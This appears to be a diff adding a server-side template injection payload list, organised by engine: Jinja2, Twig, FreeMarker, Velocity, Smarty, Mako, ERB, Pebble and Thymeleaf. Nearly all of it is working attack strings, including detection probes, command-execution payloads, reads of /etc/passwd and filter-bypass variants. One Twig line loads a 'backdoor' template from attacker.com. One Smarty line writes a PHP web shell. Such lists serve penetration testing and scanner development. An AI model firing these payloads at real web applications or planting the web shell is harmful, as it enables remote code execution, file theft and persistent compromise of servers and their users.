@@ -1,0 +1,192 @@
+# SSTI (Server-Side Template Injection) Payloads
+# Categories: Detection, Exploitation (by engine), Bypass techniques
+
+# ==================== UNIVERSAL DETECTION ====================
+# Math operations (most reliable detection method)
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{= 7*7 }}
+${{7*7}}
+{7*7}
+*{7*7}
+@{7*7}
+%{7*7}
+[[7*7]]
+
+# String concatenation
+{{"foo"+"bar"}}
+${"foo"+"bar"}
+#{"foo"+"bar"}
+<%= "foo"+"bar" %>
+
+# ==================== JINJA2 (Python Flask/Django) ====================
+# Detection
+{{config}}
+{{self}}
+{{request}}
+{{request.environ}}
+{{g}}
+{{url_for}}
+{{get_flashed_messages}}
+{{lipsum}}
+
+# RCE payloads
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__["os"].popen("id").read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}
+
+# Python 3 specific
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{[].__class__.__bases__[0].__subclasses__()}}
+
+# File read
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
+
+# ==================== TWIG (PHP Symfony) ====================
+# Detection
+{{_self}}
+{{_self.env}}
+{{_context}}
+{{app}}
+{{app.request}}
+{{app.request.server.all|join}}
+{{dump(app)}}
+
+# RCE payloads
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('exec')}}
+{{['id']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['cat /etc/passwd']|filter('exec')}}
+{{'id'|filter('system')}}
+{{_self.env.setCache("ftp://attacker.com/")}}{{_self.env.loadTemplate("backdoor")}}
+
+# File read
+{{include('/etc/passwd')}}
+{{source('/etc/passwd')}}
+{{'/'|passthru}}
+
+# ==================== FREEMARKER (Java) ====================
+# Detection
+${.version}
+${.now}
+${.main_template_name}
+${.data_model}
+${.globals}
+${.namespace}
+
+# RCE payloads
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+${object.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")><#assign rt=owc.newInstance().newInstance()><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${ec.newInstance()("id")}
+
+# File read
+${new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\Z").next()}
+<#assign is=object.getClass().getClassLoader().getResourceAsStream("/etc/passwd")>${is}
+
+# ==================== VELOCITY (Java) ====================
+# Detection
+$class
+$request
+$response
+$session
+$context
+
+# RCE payloads
+#set($x='')##$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor()
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# ==================== SMARTY (PHP) ====================
+# Detection
+{$smarty.version}
+{$smarty.template}
+{$smarty.now}
+{$smarty.const.PHP_VERSION}
+
+# RCE payloads (older versions)
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::$smarty)}
+{system('id')}
+{`id`}
+
+# ==================== MAKO (Python) ====================
+# Detection
+${self.module}
+${self.filename}
+
+# RCE payloads
+<%import os%>${os.popen("id").read()}
+<%import subprocess%>${subprocess.check_output("id", shell=True)}
+${self.module.cache.util.os.popen("id").read()}
+${self.template.module.cache.util.os.popen("id").read()}
+
+# ==================== ERB (Ruby) ====================
+# Detection
+<%= self %>
+<%= ENV %>
+<%= Dir.entries('/') %>
+
+# RCE payloads
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+<%= require 'open3'; Open3.capture2('id') %>
+<%= File.read('/etc/passwd') %>
+
+# ==================== PEBBLE (Java) ====================
+# Detection
+{{ beans }}
+{{ request }}
+
+# RCE payloads
+{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+# ==================== THYMELEAF (Java Spring) ====================
+# Detection
+*{T(java.lang.Runtime)}
+
+# RCE payloads
+${T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+
+# ==================== BYPASS TECHNIQUES ====================
+# Unicode bypass
+\u007b\u007b7*7\u007d\u007d
+%7b%7b7*7%7d%7d
+
+# Newline bypass
+{%0a{7*7}%0a}
+{{%0a7*7%0a}}
+
+# Comment bypass
+{{!-- --}}{{7*7}}
+{# comment #}{{7*7}}
+<%-- comment --%><%= 7*7 %>
+
+# Alternative delimiters
+<% 7*7 %>
+[% 7*7 %]
+(% 7*7 %)
+
+# Concatenation bypass
+{{''.constructor.constructor('return 7*7')()}}
